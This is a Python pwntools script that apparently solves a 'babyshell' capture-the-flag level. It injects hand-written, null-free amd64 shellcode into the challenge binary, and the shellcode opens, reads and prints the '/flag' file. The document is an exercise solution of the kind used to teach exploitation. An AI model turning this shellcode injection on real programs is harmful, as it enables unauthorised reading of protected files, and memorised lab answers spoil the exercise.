import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = glob.glob("/challenge/babyshell_level*")[1]

shellcode = (f'''

    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax

    xor rdi, rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rax, rax
    mov al, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 100
    xor rax, rax
    syscall

    xor rdi, rdi
    mov dil, 1
    mov rsi, rsp
    mov rdx, rax
    xor rax, rax
    mov al, 0x1
    syscall

    xor rax, rax
    mov al, 60
    xor rdi, rdi
    mov dil, 42
    syscall
 
''')

shellcode = asm(shellcode)

with process([binary]) as p:
    p.readuntilS("Reading 0x1000 bytes from stdin.")
    p.write(shellcode)
    print(p.readallS())